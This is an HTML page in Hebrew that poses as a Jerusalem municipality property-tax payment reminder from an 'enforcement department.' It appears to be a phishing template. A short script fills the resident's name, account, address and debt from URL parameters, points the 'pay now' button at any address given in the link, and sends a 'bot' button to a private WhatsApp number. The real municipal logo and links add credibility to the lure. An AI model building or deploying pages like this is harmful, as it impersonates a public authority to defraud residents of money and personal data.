<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>תשלום ארנונה</title>

<style>
body{
  font-family:Heebo,Arial;
  background:#f0f3f7;
  margin:0;
  padding:0;
  color:#0d1b2a;
}
.wrap{
  max-width:900px;
  margin:auto;
  padding:16px;
}

/* ===== HEADER ===== */
.header{
  background:#0F3A5F;
  color:white;
  padding:20px;
  display:flex;
  align-items:center;
  gap:20px;
  border-bottom:6px solid #F2A900;
  border-radius:0 0 12px 12px;
}

/* לוגו */
.header img{
  width:170px;
  height:auto;
  filter:brightness(0) invert(1);
}

.header-title{
  flex:1;
  text-align:center;
  margin-right:30px; 
}

/* ===== NOTE ===== */
.note{
  background:#fff3c8;
  border:1px solid #ffe29b;
  padding:14px;
  margin:22px 0;
  border-radius:12px;
  text-align:center;
  font-weight:700;
}

/* ===== CARD ===== */
.card{
  background:white;
  padding:22px;
  border-radius:16px;
  box-shadow:0 4px 18px rgba(0,0,0,0.12);
  overflow:hidden; /* ✅ מונע בליטות */
}

/* ===== FIELDS ===== */
.field{
  background:#f2f6ff;
  border:1px solid #d7e3ff;
  padding:14px;
  border-radius:12px;
  margin-bottom:14px;
}
.label{font-size:0.9rem;color:#55627a;}
.value{margin-top:4px;font-weight:800;font-size:1.2rem;}

/* ===== BUTTONS WRAPPER ===== */
.buttons{
  margin-top:18px;
  display:flex;
  flex-direction:column;
  gap:14px;
  width:100%;
  padding:0 4px; /* ✅ מונע חריגה שמאלה */
}

/* ===== BUTTON ===== */
.btn{
  display:block;
  width:100%;
  padding:15px;
  box-sizing:border-box; /* ✅ תיקון חובה */
  text-align:center;
  border-radius:12px;
  font-weight:800;
  font-size:1.15rem;
  text-decoration:none;
}

/* ירוק */
.btn-pay{
  background:#1fa548;
  color:white;
  border:2px solid #17853a;
}
.btn-pay span{
  margin-right:6px;
  display:inline-block;
  transition:0.3s;
}
.btn-pay:hover span{
  transform:translateX(8px);
}

/* לבן */
.btn-white{
  background:white;
  border:1px solid #d7e3ff;
  color:#1D3354;
  box-shadow:0 3px 10px rgba(0,0,0,0.08);
}

/* FOOTER */
.footer{
  background:#0F2748;
  color:white;
  padding:24px;
  text-align:center;
  margin-top:32px;
  border-radius:12px;
  font-size:1.05rem;
}
</style>
</head>

<body>
<div class="wrap">

  <div class="header">
    <a href="https://www.jerusalem.muni.il" target="_blank">
      <img src="https://www.jerusalem.muni.il/images/logo-new2.svg">
    </a>

    <div class="header-title">
      <b style="font-size:1.4rem;">מחלקת אכיפה — עיריית ירושלים</b><br>
      <small>תשלום ארנונה</small>
    </div>
  </div>

  <div class="card">

    <div class="note">⚠️ תזכורת לפני נקיטת הליכי אכיפה</div>

    <div class="field"><div class="label">שם תושב</div><div id="name" class="value"></div></div>
    <div class="field"><div class="label">מס' חשבון ארנונה</div><div id="account" class="value"></div></div>
    <div class="field"><div class="label">כתובת</div><div id="address" class="value"></div></div>
    <div class="field"><div class="label">גובה החוב (₪)</div><div id="balance" class="value" style="color:#b71c1c;"></div></div>

    <div class="buttons">

      <a id="paybtn" class="btn btn-pay" target="_blank">
        <span>💳</span> לתשלום עכשיו
      </a>

      <a class="btn btn-white" href="https://jeronlineforms.jerusalem.muni.il/ArnonaBalanceApproval" target="_blank">
        📄 פירוט חשבון מלא
      </a>

      <a class="btn btn-white" href="tel:026293333">
        ☎ מעבר לנציג
      </a>

      <a id="wa" class="btn btn-white" target="_blank">
        🤖 ArnonaBot
      </a>

    </div>

  </div>

  <div class="footer">
    אגף לשירות ופניות ארנונה<br>
    עיריית ירושלים
  </div>

</div>

<script>
const p=new URL(location.href).searchParams;
name.textContent = p.get("name") || "";
account.textContent = p.get("account") || "";
address.textContent = p.get("address") || "";
balance.textContent = p.get("balance") || "";
paybtn.href = p.get("pay") || "#";
wa.href = "https://wa.me/972559597593?text=שלום "+encodeURIComponent(p.get("name")||"");
</script>

</body>
</html>
